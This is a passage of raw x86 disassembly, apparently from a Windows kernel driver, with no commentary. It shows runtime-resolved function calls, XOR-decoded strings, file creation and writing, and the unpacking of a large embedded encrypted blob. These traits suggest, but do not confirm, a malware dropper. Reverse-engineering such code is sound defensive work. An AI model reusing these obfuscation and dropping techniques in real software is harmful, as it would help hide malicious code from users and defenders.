   177ea:	call   eax
   177ec:	cmp    DWORD PTR [ebp-0x44],esi
   177ef:	jne    0x17825
   177f1:	push   ebx
   177f2:	push   0x4
   177f4:	lea    eax,[ebp+0xc]
   177f7:	push   eax
   177f8:	push   0x9
   177fa:	push   DWORD PTR [ebp+0x8]
   177fd:	mov    DWORD PTR [ebp+0xc],ebx
   17800:	call   0x1193e
   17805:	call   eax
   17807:	test   eax,eax
   17809:	jge    0x1780e
   1780b:	mov    DWORD PTR [ebp+0xc],ebx
   1780e:	cmp    DWORD PTR [ebp+0xc],ebx
   17811:	je     0x17825
   17813:	lea    eax,[ebp-0x30]
   17816:	push   eax
   17817:	push   DWORD PTR [ebp+0xc]
   1781a:	call   0x17396
   1781f:	push   ebx
   17820:	call   0x10f3a
   17825:	cmp    BYTE PTR [ebp-0x1],bl
   17828:	je     0x17893
   1782a:	mov    esi,DWORD PTR [ebp-0x1c]
   1782d:	cmp    esi,ebx
   1782f:	je     0x17893
   17831:	cmp    BYTE PTR [ebp-0xc],bl
   17834:	jne    0x17893
   17836:	push   0x6
   17838:	pop    ecx
   17839:	push   ebx
   1783a:	xor    eax,eax
   1783c:	mov    DWORD PTR [ebp-0x4c],ebx
   1783f:	lea    edi,[ebp-0x48]
   17842:	push   0x1c
   17844:	rep stos DWORD PTR es:[edi],eax
   17846:	lea    eax,[ebp-0x4c]
   17849:	push   eax
   1784a:	push   ebx
   1784b:	push   DWORD PTR [ebp+0x8]
   1784e:	call   0x1193e
   17853:	call   eax
   17855:	cmp    DWORD PTR [ebp-0x44],esi
   17858:	jne    0x17893
   1785a:	push   ebx
   1785b:	push   0x4
   1785d:	lea    eax,[ebp+0xc]
   17860:	push   eax
   17861:	push   0x9
   17863:	push   DWORD PTR [ebp+0x8]
   17866:	mov    DWORD PTR [ebp+0xc],ebx
   17869:	call   0x1193e
   1786e:	call   eax
   17870:	test   eax,eax
   17872:	jge    0x17877
   17874:	mov    DWORD PTR [ebp+0xc],ebx
   17877:	cmp    DWORD PTR [ebp+0xc],ebx
   1787a:	je     0x17893
   1787c:	lea    eax,[ebp-0x1c]
   1787f:	push   eax
   17880:	push   DWORD PTR [ebp+0xc]
   17883:	call   0x124ce
   17888:	lea    eax,[ebp-0x1c]
   1788b:	push   eax
   1788c:	push   0x1
   1788e:	call   0x10ef2
   17893:	mov    eax,DWORD PTR [ebp-0x8]
   17896:	pop    edi
   17897:	pop    esi
   17898:	pop    ebx
   17899:	leave  
   1789a:	ret    0x8
   1789d:	int3   
   1789e:	int3   
   1789f:	int3   
   178a0:	int3   
   178a1:	int3   
   178a2:	push   0x24
   178a4:	push   0x7df68
   178a9:	call   0x1db1c
   178ae:	xor    ebx,ebx
   178b0:	push   ebx
   178b1:	push   ebx
   178b2:	push   ebx
   178b3:	push   ebx
   178b4:	push   0x7eb70
   178b9:	call   DWORD PTR ds:0x1f028
   178bf:	cmp    eax,ebx
   178c1:	jge    0x178d2
   178c3:	mov    eax,DWORD PTR [ebp+0x8]
   178c6:	mov    DWORD PTR [eax+0x8],0x4
   178cd:	jmp    0x1798a
   178d2:	mov    DWORD PTR [ebp-0x4],ebx
   178d5:	push   0xffffffff
   178d7:	mov    esi,DWORD PTR [ebp+0x8]
   178da:	lea    eax,[esi+0xc]
   178dd:	push   eax
   178de:	lea    ecx,[ebp-0x24]
   178e1:	call   0x1298a
   178e6:	push   0xffffffff
   178e8:	mov    eax,DWORD PTR [ebp-0x20]
   178eb:	lea    eax,[eax+esi*1+0xd]
   178ef:	push   eax
   178f0:	lea    ecx,[ebp-0x2c]
   178f3:	call   0x1298a
   178f8:	push   0xffffffff
   178fa:	push   0x1df30
   178ff:	lea    ecx,[ebp-0x34]
   17902:	call   0x110ae
   17907:	lea    eax,[ebp-0x34]
   1790a:	push   eax
   1790b:	lea    eax,[ebp-0x2c]
   1790e:	push   eax
   1790f:	call   0x19814
   17914:	mov    BYTE PTR [ebp-0x19],al
   17917:	push   DWORD PTR [ebp-0x34]
   1791a:	call   0x10a9a
   1791f:	pop    ecx
   17920:	lea    eax,[ebp-0x24]
   17923:	mov    ecx,DWORD PTR ds:0x7eb40
   17929:	push   eax
   1792a:	cmp    BYTE PTR [ebp-0x19],bl
   1792d:	je     0x17936
   1792f:	call   0x161b0
   17934:	jmp    0x17946
   17936:	call   0x16ef8
   1793b:	lea    ecx,[ebp-0x2c]
   1793e:	push   ecx
   1793f:	mov    ecx,eax
   17941:	call   0x129cc
   17946:	mov    DWORD PTR [esi+0x8],ebx
   17949:	push   DWORD PTR [ebp-0x2c]
   1794c:	call   0x10a9a
   17951:	push   DWORD PTR [ebp-0x24]
   17954:	call   0x10a9a
   17959:	pop    ecx
   1795a:	pop    ecx
   1795b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17962:	jmp    0x1797e
   17964:	xor    eax,eax
   17966:	inc    eax
   17967:	ret    
   17968:	mov    esp,DWORD PTR [ebp-0x18]
   1796b:	mov    eax,DWORD PTR [ebp+0x8]
   1796e:	mov    DWORD PTR [eax+0x8],0x4
   17975:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1797c:	xor    ebx,ebx
   1797e:	push   ebx
   1797f:	push   0x7eb70
   17984:	call   DWORD PTR ds:0x1f024
   1798a:	call   0x1db61
   1798f:	ret    0x4
   17992:	int3   
   17993:	int3   
   17994:	int3   
   17995:	int3   
   17996:	int3   
   17997:	int3   
   17998:	push   0xc
   1799a:	push   0x7df88
   1799f:	call   0x1db1c
   179a4:	xor    edi,edi
   179a6:	push   edi
   179a7:	push   edi
   179a8:	push   edi
   179a9:	push   edi
   179aa:	push   0x7eb70
   179af:	call   DWORD PTR ds:0x1f028
   179b5:	cmp    eax,edi
   179b7:	jge    0x179c5
   179b9:	mov    eax,DWORD PTR [ebp+0x8]
   179bc:	mov    DWORD PTR [eax+0x8],0x4
   179c3:	jmp    0x17a3b
   179c5:	mov    DWORD PTR [ebp-0x4],edi
   179c8:	mov    esi,DWORD PTR [ebp+0x8]
   179cb:	lea    eax,[esi+0x4]
   179ce:	mov    ecx,DWORD PTR ds:0x7ebcc
   179d4:	push   eax
   179d5:	cmp    DWORD PTR [esi],edi
   179d7:	jbe    0x17a04
   179d9:	call   0x16f68
   179de:	mov    ebx,eax
   179e0:	push   DWORD PTR [esi]
   179e2:	lea    eax,[esi+0xc]
   179e5:	push   eax
   179e6:	lea    ecx,[ebp-0x1c]
   179e9:	call   0x137bc
   179ee:	push   eax
   179ef:	mov    ecx,ebx
   179f1:	call   0x11f30
   179f6:	mov    ecx,DWORD PTR [ebp-0x1c]
   179f9:	cmp    ecx,edi
   179fb:	je     0x17a09
   179fd:	call   0x10ab8
   17a02:	jmp    0x17a09
   17a04:	call   0x16b9a
   17a09:	mov    DWORD PTR [esi+0x8],edi
   17a0c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17a13:	jmp    0x17a2f
   17a15:	xor    eax,eax
   17a17:	inc    eax
   17a18:	ret    
   17a19:	mov    esp,DWORD PTR [ebp-0x18]
   17a1c:	mov    eax,DWORD PTR [ebp+0x8]
   17a1f:	mov    DWORD PTR [eax+0x8],0x4
   17a26:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17a2d:	xor    edi,edi
   17a2f:	push   edi
   17a30:	push   0x7eb70
   17a35:	call   DWORD PTR ds:0x1f024
   17a3b:	call   0x1db61
   17a40:	ret    0x4
   17a43:	int3   
   17a44:	int3   
   17a45:	int3   
   17a46:	int3   
   17a47:	int3   
   17a48:	mov    edi,edi
   17a4a:	push   ebp
   17a4b:	mov    ebp,esp
   17a4d:	sub    esp,0x10
   17a50:	and    DWORD PTR [ebp-0xc],0x0
   17a54:	xor    ecx,ecx
   17a56:	mov    DWORD PTR [ebp-0x10],0x1
   17a5d:	xor    eax,eax
   17a5f:	mov    dl,BYTE PTR [eax+0x7a2ec]
   17a65:	xor    BYTE PTR [ebp+ecx*1-0x10],dl
   17a69:	inc    ecx
   17a6a:	inc    eax
   17a6b:	and    eax,0xf
   17a6e:	cmp    ecx,0x8
   17a71:	jne    0x17a5f
   17a73:	push   ecx
   17a74:	lea    eax,[ebp-0x10]
   17a77:	push   eax
   17a78:	lea    ecx,[ebp-0x8]
   17a7b:	mov    DWORD PTR [ebp-0x4],0x2
   17a82:	call   0x137bc
   17a87:	mov    ecx,DWORD PTR ds:0x7ebcc
   17a8d:	push   eax
   17a8e:	lea    eax,[ebp-0x4]
   17a91:	push   eax
   17a92:	call   0x16f68
   17a97:	mov    ecx,eax
   17a99:	call   0x11f30
   17a9e:	mov    ecx,DWORD PTR [ebp-0x8]
   17aa1:	test   ecx,ecx
   17aa3:	je     0x17aaa
   17aa5:	call   0x10ab8
   17aaa:	leave  
   17aab:	ret    
   17aac:	int3   
   17aad:	int3   
   17aae:	int3   
   17aaf:	int3   
   17ab0:	int3   
   17ab1:	int3   
   17ab2:	push   0x848
   17ab7:	push   0x7dfa8
   17abc:	call   0x1de20
   17ac1:	xor    ebx,ebx
   17ac3:	mov    BYTE PTR [ebp-0x81d],bl
   17ac9:	xor    eax,eax
   17acb:	mov    WORD PTR [ebp-0x81c],ax
   17ad2:	push   0x7fe
   17ad7:	push   ebx
   17ad8:	lea    eax,[ebp-0x81a]
   17ade:	push   eax
   17adf:	call   0x1daf6
   17ae4:	add    esp,0xc
   17ae7:	push   0x1e82a
   17aec:	push   0x15
   17aee:	push   0x1e7fe
   17af3:	call   0x16c9e
   17af8:	mov    edx,eax
   17afa:	mov    cx,WORD PTR [eax]
   17afd:	inc    eax
   17afe:	inc    eax
   17aff:	cmp    cx,bx
   17b02:	jne    0x17afa
   17b04:	sub    eax,edx
   17b06:	lea    edi,[ebp-0x81c]
   17b0c:	dec    edi
   17b0d:	dec    edi
   17b0e:	mov    cx,WORD PTR [edi+0x2]
   17b12:	inc    edi
   17b13:	inc    edi
   17b14:	cmp    cx,bx
   17b17:	jne    0x17b0e
   17b19:	mov    ecx,eax
   17b1b:	mov    esi,edx
   17b1d:	shr    ecx,0x2
   17b20:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b22:	mov    ecx,eax
   17b24:	and    ecx,0x3
   17b27:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17b29:	mov    eax,0x7e208
   17b2e:	mov    edx,eax
   17b30:	mov    cx,WORD PTR [eax]
   17b33:	inc    eax
   17b34:	inc    eax
   17b35:	cmp    cx,bx
   17b38:	jne    0x17b30
   17b3a:	sub    eax,edx
   17b3c:	lea    edi,[ebp-0x81c]
   17b42:	dec    edi
   17b43:	dec    edi
   17b44:	mov    cx,WORD PTR [edi+0x2]
   17b48:	inc    edi
   17b49:	inc    edi
   17b4a:	cmp    cx,bx
   17b4d:	jne    0x17b44
   17b4f:	mov    ecx,eax
   17b51:	mov    esi,edx
   17b53:	shr    ecx,0x2
   17b56:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b58:	mov    ecx,eax
   17b5a:	and    ecx,0x3
   17b5d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17b5f:	push   0x1e7ce
   17b64:	push   0x4
   17b66:	push   0x1e5c8
   17b6b:	call   0x16c9e
   17b70:	mov    edx,eax
   17b72:	mov    cx,WORD PTR [eax]
   17b75:	inc    eax
   17b76:	inc    eax
   17b77:	cmp    cx,bx
   17b7a:	jne    0x17b72
   17b7c:	sub    eax,edx
   17b7e:	lea    edi,[ebp-0x81c]
   17b84:	dec    edi
   17b85:	dec    edi
   17b86:	mov    cx,WORD PTR [edi+0x2]
   17b8a:	inc    edi
   17b8b:	inc    edi
   17b8c:	cmp    cx,bx
   17b8f:	jne    0x17b86
   17b91:	mov    ecx,eax
   17b93:	mov    esi,edx
   17b95:	shr    ecx,0x2
   17b98:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b9a:	mov    ecx,eax
   17b9c:	and    ecx,0x3
   17b9f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17ba1:	lea    eax,[ebp-0x81c]
   17ba7:	push   eax
   17ba8:	lea    eax,[ebp-0x858]
   17bae:	push   eax
   17baf:	call   0x11c5c
   17bb4:	call   eax
   17bb6:	mov    DWORD PTR [ebp-0x824],ebx
   17bbc:	xor    eax,eax
   17bbe:	lea    edi,[ebp-0x84c]
   17bc4:	stos   DWORD PTR es:[edi],eax
   17bc5:	stos   DWORD PTR es:[edi],eax
   17bc6:	stos   DWORD PTR es:[edi],eax
   17bc7:	stos   DWORD PTR es:[edi],eax
   17bc8:	stos   DWORD PTR es:[edi],eax
   17bc9:	mov    DWORD PTR [ebp-0x830],ebx
   17bcf:	xor    eax,eax
   17bd1:	lea    edi,[ebp-0x82c]
   17bd7:	stos   DWORD PTR es:[edi],eax
   17bd8:	mov    DWORD PTR [ebp-0x850],0x18
   17be2:	mov    DWORD PTR [ebp-0x84c],ebx
   17be8:	mov    DWORD PTR [ebp-0x844],0x240
   17bf2:	lea    eax,[ebp-0x858]
   17bf8:	mov    DWORD PTR [ebp-0x848],eax
   17bfe:	mov    DWORD PTR [ebp-0x840],ebx
   17c04:	mov    DWORD PTR [ebp-0x83c],ebx
   17c0a:	push   ebx
   17c0b:	push   ebx
   17c0c:	push   0x60
   17c0e:	push   0x1
   17c10:	push   ebx
   17c11:	push   0x80
   17c16:	push   ebx
   17c17:	lea    eax,[ebp-0x830]
   17c1d:	push   eax
   17c1e:	lea    eax,[ebp-0x850]
   17c24:	push   eax
   17c25:	push   0x100001
   17c2a:	lea    eax,[ebp-0x824]
   17c30:	push   eax
   17c31:	call   0x1186c
   17c36:	call   eax
   17c38:	cmp    eax,ebx
   17c3a:	jge    0x17c43
   17c3c:	xor    al,al
   17c3e:	jmp    0x17cd8
   17c43:	mov    DWORD PTR [ebp-0x4],ebx
   17c46:	mov    esi,DWORD PTR [ebp+0xc]
   17c49:	mov    eax,0x10000
   17c4e:	cmp    esi,eax
   17c50:	jbe    0x17c54
   17c52:	mov    esi,eax
   17c54:	push   esi
   17c55:	call   0x10a66
   17c5a:	pop    ecx
   17c5b:	mov    DWORD PTR [ebp-0x828],eax
   17c61:	mov    DWORD PTR [ebp-0x838],ebx
   17c67:	xor    eax,eax
   17c69:	lea    edi,[ebp-0x834]
   17c6f:	stos   DWORD PTR es:[edi],eax
   17c70:	push   ebx
   17c71:	lea    eax,[ebp-0x838]
   17c77:	push   eax
   17c78:	push   esi
   17c79:	push   DWORD PTR [ebp-0x828]
   17c7f:	lea    eax,[ebp-0x830]
   17c85:	push   eax
   17c86:	push   ebx
   17c87:	push   ebx
   17c88:	push   ebx
   17c89:	push   DWORD PTR [ebp-0x824]
   17c8f:	call   0x11ab8
   17c94:	call   eax
   17c96:	cmp    eax,ebx
   17c98:	jl     0x17cbf
   17c9a:	mov    ecx,DWORD PTR [ebp-0x82c]
   17ca0:	mov    edi,DWORD PTR [ebp+0x8]
   17ca3:	mov    esi,DWORD PTR [ebp-0x828]
   17ca9:	xor    eax,eax
   17cab:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   17cad:	sete   al
   17cb0:	mov    BYTE PTR [ebp-0x81d],al
   17cb6:	jmp    0x17cbf
   17cb8:	xor    eax,eax
   17cba:	inc    eax
   17cbb:	ret    
   17cbc:	mov    esp,DWORD PTR [ebp-0x18]
   17cbf:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17cc6:	push   DWORD PTR [ebp-0x824]
   17ccc:	call   DWORD PTR ds:0x1f060
   17cd2:	mov    al,BYTE PTR [ebp-0x81d]
   17cd8:	call   0x1de68
   17cdd:	ret    0x8
   17ce0:	int3   
   17ce1:	int3   
   17ce2:	int3   
   17ce3:	int3   
   17ce4:	int3   
   17ce5:	int3   
   17ce6:	push   0x874
   17ceb:	push   0x7dfc8
   17cf0:	call   0x1de20
   17cf5:	mov    eax,DWORD PTR [ebp+0x8]
   17cf8:	mov    DWORD PTR [ebp-0x830],eax
   17cfe:	xor    ebx,ebx
   17d00:	mov    BYTE PTR [ebp-0x81d],bl
   17d06:	xor    eax,eax
   17d08:	mov    WORD PTR [ebp-0x81c],ax
   17d0f:	push   0x7fe
   17d14:	push   ebx
   17d15:	lea    eax,[ebp-0x81a]
   17d1b:	push   eax
   17d1c:	call   0x1daf6
   17d21:	add    esp,0xc
   17d24:	push   0x1e892
   17d29:	push   0x15
   17d2b:	push   0x1e7fe
   17d30:	call   0x16c9e
   17d35:	mov    edx,eax
   17d37:	mov    cx,WORD PTR [eax]
   17d3a:	inc    eax
   17d3b:	inc    eax
   17d3c:	cmp    cx,bx
   17d3f:	jne    0x17d37
   17d41:	sub    eax,edx
   17d43:	lea    edi,[ebp-0x81c]
   17d49:	dec    edi
   17d4a:	dec    edi
   17d4b:	mov    cx,WORD PTR [edi+0x2]
   17d4f:	inc    edi
   17d50:	inc    edi
   17d51:	cmp    cx,bx
   17d54:	jne    0x17d4b
   17d56:	mov    ecx,eax
   17d58:	mov    esi,edx
   17d5a:	shr    ecx,0x2
   17d5d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17d5f:	mov    ecx,eax
   17d61:	and    ecx,0x3
   17d64:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17d66:	mov    eax,0x7e208
   17d6b:	mov    edx,eax
   17d6d:	mov    cx,WORD PTR [eax]
   17d70:	inc    eax
   17d71:	inc    eax
   17d72:	cmp    cx,bx
   17d75:	jne    0x17d6d
   17d77:	sub    eax,edx
   17d79:	lea    edi,[ebp-0x81c]
   17d7f:	dec    edi
   17d80:	dec    edi
   17d81:	mov    cx,WORD PTR [edi+0x2]
   17d85:	inc    edi
   17d86:	inc    edi
   17d87:	cmp    cx,bx
   17d8a:	jne    0x17d81
   17d8c:	mov    ecx,eax
   17d8e:	mov    esi,edx
   17d90:	shr    ecx,0x2
   17d93:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17d95:	mov    ecx,eax
   17d97:	and    ecx,0x3
   17d9a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17d9c:	push   0x1e866
   17da1:	push   0x4
   17da3:	push   0x1e5c8
   17da8:	call   0x16c9e
   17dad:	mov    edx,eax
   17daf:	mov    cx,WORD PTR [eax]
   17db2:	inc    eax
   17db3:	inc    eax
   17db4:	cmp    cx,bx
   17db7:	jne    0x17daf
   17db9:	sub    eax,edx
   17dbb:	lea    edi,[ebp-0x81c]
   17dc1:	dec    edi
   17dc2:	dec    edi
   17dc3:	mov    cx,WORD PTR [edi+0x2]
   17dc7:	inc    edi
   17dc8:	inc    edi
   17dc9:	cmp    cx,bx
   17dcc:	jne    0x17dc3
   17dce:	mov    ecx,eax
   17dd0:	mov    esi,edx
   17dd2:	shr    ecx,0x2
   17dd5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17dd7:	mov    ecx,eax
   17dd9:	and    ecx,0x3
   17ddc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17dde:	lea    eax,[ebp-0x81c]
   17de4:	push   eax
   17de5:	lea    eax,[ebp-0x884]
   17deb:	push   eax
   17dec:	call   0x11c5c
   17df1:	call   eax
   17df3:	mov    DWORD PTR [ebp-0x824],ebx
   17df9:	xor    eax,eax
   17dfb:	lea    edi,[ebp-0x850]
   17e01:	stos   DWORD PTR es:[edi],eax
   17e02:	stos   DWORD PTR es:[edi],eax
   17e03:	stos   DWORD PTR es:[edi],eax
   17e04:	stos   DWORD PTR es:[edi],eax
   17e05:	stos   DWORD PTR es:[edi],eax
   17e06:	mov    DWORD PTR [ebp-0x82c],ebx
   17e0c:	xor    eax,eax
   17e0e:	lea    edi,[ebp-0x828]
   17e14:	stos   DWORD PTR es:[edi],eax
   17e15:	mov    DWORD PTR [ebp-0x854],0x18
   17e1f:	mov    DWORD PTR [ebp-0x850],ebx
   17e25:	mov    DWORD PTR [ebp-0x848],0x240
   17e2f:	lea    eax,[ebp-0x884]
   17e35:	mov    DWORD PTR [ebp-0x84c],eax
   17e3b:	mov    DWORD PTR [ebp-0x844],ebx
   17e41:	mov    DWORD PTR [ebp-0x840],ebx
   17e47:	push   ebx
   17e48:	push   ebx
   17e49:	push   0x60
   17e4b:	push   ebx
   17e4c:	push   ebx
   17e4d:	push   0x80
   17e52:	push   ebx
   17e53:	lea    eax,[ebp-0x82c]
   17e59:	push   eax
   17e5a:	lea    eax,[ebp-0x854]
   17e60:	push   eax
   17e61:	push   0x100002
   17e66:	lea    eax,[ebp-0x824]
   17e6c:	push   eax
   17e6d:	call   0x1186c
   17e72:	call   eax
   17e74:	cmp    eax,ebx
   17e76:	jge    0x17e7f
   17e78:	xor    al,al
   17e7a:	jmp    0x17f84
   17e7f:	mov    DWORD PTR [ebp-0x4],ebx
   17e82:	xor    eax,eax
   17e84:	lea    edi,[ebp-0x82c]
   17e8a:	stos   DWORD PTR es:[edi],eax
   17e8b:	stos   DWORD PTR es:[edi],eax
   17e8c:	xor    edi,edi
   17e8e:	mov    esi,0x10000
   17e93:	mov    DWORD PTR [ebp-0x834],edi
   17e99:	mov    eax,DWORD PTR [ebp+0xc]
   17e9c:	cmp    edi,eax
   17e9e:	jae    0x17ee9
   17ea0:	mov    DWORD PTR [ebp-0x83c],ebx
   17ea6:	mov    DWORD PTR [ebp-0x83c],edi
   17eac:	mov    DWORD PTR [ebp-0x838],ebx
   17eb2:	sub    eax,edi
   17eb4:	cmp    eax,esi
   17eb6:	jb     0x17eba
   17eb8:	mov    eax,esi
   17eba:	push   ebx
   17ebb:	push   ebx
   17ebc:	push   eax
   17ebd:	mov    eax,DWORD PTR [ebp-0x830]
   17ec3:	add    eax,edi
   17ec5:	push   eax
   17ec6:	lea    eax,[ebp-0x82c]
   17ecc:	push   eax
   17ecd:	push   ebx
   17ece:	push   ebx
   17ecf:	push   ebx
   17ed0:	push   DWORD PTR [ebp-0x824]
   17ed6:	call   0x11b0c
   17edb:	call   eax
   17edd:	cmp    eax,ebx
   17edf:	jl     0x17f6b
   17ee5:	add    edi,esi
   17ee7:	jmp    0x17e93
   17ee9:	mov    BYTE PTR [ebp-0x81d],0x1
   17ef0:	mov    DWORD PTR [ebp-0x87c],ebx
   17ef6:	push   0x9
   17ef8:	pop    ecx
   17ef9:	xor    eax,eax
   17efb:	lea    edi,[ebp-0x878]
   17f01:	rep stos DWORD PTR es:[edi],eax
   17f03:	mov    eax,DWORD PTR [ebp+0x10]
   17f06:	mov    DWORD PTR [ebp-0x86c],eax
   17f0c:	mov    ecx,DWORD PTR [ebp+0x14]
   17f0f:	mov    DWORD PTR [ebp-0x868],ecx
   17f15:	mov    DWORD PTR [ebp-0x874],eax
   17f1b:	mov    DWORD PTR [ebp-0x870],ecx
   17f21:	mov    DWORD PTR [ebp-0x864],eax
   17f27:	mov    DWORD PTR [ebp-0x860],ecx
   17f2d:	mov    DWORD PTR [ebp-0x87c],eax
   17f33:	mov    DWORD PTR [ebp-0x878],ecx
   17f39:	mov    DWORD PTR [ebp-0x85c],0x80
   17f43:	push   0x4
   17f45:	push   0x28
   17f47:	lea    eax,[ebp-0x87c]
   17f4d:	push   eax
   17f4e:	lea    eax,[ebp-0x82c]
   17f54:	push   eax
   17f55:	push   DWORD PTR [ebp-0x824]
   17f5b:	call   0x11ae2
   17f60:	call   eax
   17f62:	jmp    0x17f6b
   17f64:	xor    eax,eax
   17f66:	inc    eax
   17f67:	ret    
   17f68:	mov    esp,DWORD PTR [ebp-0x18]
   17f6b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17f72:	push   DWORD PTR [ebp-0x824]
   17f78:	call   DWORD PTR ds:0x1f060
   17f7e:	mov    al,BYTE PTR [ebp-0x81d]
   17f84:	call   0x1de68
   17f89:	ret    0x10
   17f8c:	int3   
   17f8d:	int3   
   17f8e:	int3   
   17f8f:	int3   
   17f90:	int3   
   17f91:	int3   
   17f92:	push   0x874
   17f97:	push   0x7dfe8
   17f9c:	call   0x1de20
   17fa1:	xor    ebx,ebx
   17fa3:	mov    BYTE PTR [ebp-0x81d],bl
   17fa9:	mov    BYTE PTR [ebp-0x81e],bl
   17faf:	mov    DWORD PTR [ebp-0x828],ebx
   17fb5:	mov    DWORD PTR [ebp-0x824],ebx
   17fbb:	xor    eax,eax
   17fbd:	mov    WORD PTR [ebp-0x81c],ax
   17fc4:	push   0x7fe
   17fc9:	push   ebx
   17fca:	lea    eax,[ebp-0x81a]
   17fd0:	push   eax
   17fd1:	call   0x1daf6
   17fd6:	add    esp,0xc
   17fd9:	push   0x1e908
   17fde:	push   0x15
   17fe0:	push   0x1e7fe
   17fe5:	call   0x16c9e
   17fea:	mov    edx,eax
   17fec:	mov    cx,WORD PTR [eax]
   17fef:	inc    eax
   17ff0:	inc    eax
   17ff1:	cmp    cx,bx
   17ff4:	jne    0x17fec
   17ff6:	sub    eax,edx
   17ff8:	lea    edi,[ebp-0x81c]
   17ffe:	dec    edi
   17fff:	dec    edi
   18000:	mov    cx,WORD PTR [edi+0x2]
   18004:	inc    edi
   18005:	inc    edi
   18006:	cmp    cx,bx
   18009:	jne    0x18000
   1800b:	mov    ecx,eax
   1800d:	mov    esi,edx
   1800f:	shr    ecx,0x2
   18012:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18014:	mov    ecx,eax
   18016:	and    ecx,0x3
   18019:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1801b:	mov    eax,0x7e248
   18020:	mov    edx,eax
   18022:	mov    cx,WORD PTR [eax]
   18025:	inc    eax
   18026:	inc    eax
   18027:	cmp    cx,bx
   1802a:	jne    0x18022
   1802c:	sub    eax,edx
   1802e:	lea    edi,[ebp-0x81c]
   18034:	dec    edi
   18035:	dec    edi
   18036:	mov    cx,WORD PTR [edi+0x2]
   1803a:	inc    edi
   1803b:	inc    edi
   1803c:	cmp    cx,bx
   1803f:	jne    0x18036
   18041:	mov    ecx,eax
   18043:	mov    esi,edx
   18045:	shr    ecx,0x2
   18048:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1804a:	mov    ecx,eax
   1804c:	and    ecx,0x3
   1804f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18051:	push   0x1e8d0
   18056:	push   0x4
   18058:	push   0x1e8c6
   1805d:	call   0x16c9e
   18062:	mov    edx,eax
   18064:	mov    cx,WORD PTR [eax]
   18067:	inc    eax
   18068:	inc    eax
   18069:	cmp    cx,bx
   1806c:	jne    0x18064
   1806e:	sub    eax,edx
   18070:	lea    edi,[ebp-0x81c]
   18076:	dec    edi
   18077:	dec    edi
   18078:	mov    cx,WORD PTR [edi+0x2]
   1807c:	inc    edi
   1807d:	inc    edi
   1807e:	cmp    cx,bx
   18081:	jne    0x18078
   18083:	mov    ecx,eax
   18085:	mov    esi,edx
   18087:	shr    ecx,0x2
   1808a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1808c:	mov    ecx,eax
   1808e:	and    ecx,0x3
   18091:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18093:	lea    eax,[ebp-0x81c]
   18099:	push   eax
   1809a:	lea    eax,[ebp-0x85c]
   180a0:	push   eax
   180a1:	call   0x11c5c
   180a6:	call   eax
   180a8:	xor    eax,eax
   180aa:	lea    edi,[ebp-0x850]
   180b0:	stos   DWORD PTR es:[edi],eax
   180b1:	stos   DWORD PTR es:[edi],eax
   180b2:	stos   DWORD PTR es:[edi],eax
   180b3:	stos   DWORD PTR es:[edi],eax
   180b4:	stos   DWORD PTR es:[edi],eax
   180b5:	mov    DWORD PTR [ebp-0x834],ebx
   180bb:	xor    eax,eax
   180bd:	lea    edi,[ebp-0x830]
   180c3:	stos   DWORD PTR es:[edi],eax
   180c4:	mov    DWORD PTR [ebp-0x82c],ebx
   180ca:	mov    DWORD PTR [ebp-0x854],0x18
   180d4:	mov    DWORD PTR [ebp-0x850],ebx
   180da:	mov    DWORD PTR [ebp-0x848],0x240
   180e4:	lea    eax,[ebp-0x85c]
   180ea:	mov    DWORD PTR [ebp-0x84c],eax
   180f0:	mov    DWORD PTR [ebp-0x844],ebx
   180f6:	mov    DWORD PTR [ebp-0x840],ebx
   180fc:	push   ebx
   180fd:	push   ebx
   180fe:	push   ebx
   180ff:	push   0x1
   18101:	push   0x7
   18103:	push   ebx
   18104:	push   ebx
   18105:	lea    eax,[ebp-0x834]
   1810b:	push   eax
   1810c:	lea    eax,[ebp-0x854]
   18112:	push   eax
   18113:	push   0x89
   18118:	lea    eax,[ebp-0x82c]
   1811e:	push   eax
   1811f:	call   0x1186c
   18124:	call   eax
   18126:	cmp    eax,ebx
   18128:	jge    0x18131
   1812a:	xor    al,al
   1812c:	jmp    0x18250
   18131:	mov    DWORD PTR [ebp-0x884],ebx
   18137:	push   0x9
   18139:	pop    ecx
   1813a:	xor    eax,eax
   1813c:	lea    edi,[ebp-0x880]
   18142:	rep stos DWORD PTR es:[edi],eax
   18144:	mov    DWORD PTR [ebp-0x4],ebx
   18147:	push   0x4
   18149:	push   0x28
   1814b:	lea    eax,[ebp-0x884]
   18151:	push   eax
   18152:	lea    eax,[ebp-0x834]
   18158:	push   eax
   18159:	push   DWORD PTR [ebp-0x82c]
   1815f:	call   0x11b36
   18164:	call   eax
   18166:	cmp    eax,ebx
   18168:	jl     0x181e6
   1816a:	mov    esi,0x5b221
   1816f:	push   esi
   18170:	call   0x10a66
   18175:	mov    edi,eax
   18177:	push   esi
   18178:	push   0x1f0a0
   1817d:	push   edi
   1817e:	call   0x1dade
   18183:	add    esp,0x10
   18186:	push   0x25
   18188:	push   0x7a2c4
   1818d:	push   esi
   1818e:	push   edi
   1818f:	call   0x10ad8
   18194:	lea    eax,[ebp-0x828]
   1819a:	push   eax
